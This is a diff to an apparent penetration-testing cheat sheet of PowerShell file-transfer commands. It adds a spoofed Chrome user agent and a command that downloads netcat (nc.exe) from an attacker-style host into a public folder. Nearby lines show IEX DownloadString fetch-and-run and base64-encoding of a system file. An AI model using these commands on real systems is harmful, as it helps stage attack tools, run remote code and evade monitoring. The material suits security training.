@@ -43,6 +43,12 @@ List User Agents
 ```
 ^list-user-agents
 
+Save User Agent
+```powershell
+$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
+```
+^save-user-agent
+
 
 ```powershell
 (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
@@ -60,6 +66,12 @@ IEX (New-Object Net.WebClient).DownloadString('<Target File URL>','<Output File 
 Invoke-WebRequest <Target File URL> -OutFile <Output File Name> -UseBasicParsing
 ```
 ^outfile-invoke-webrequest
+
+```powershell
+Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
+```
+^invoke-webrequest-user-agent
+
 
 ```powershell
 $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
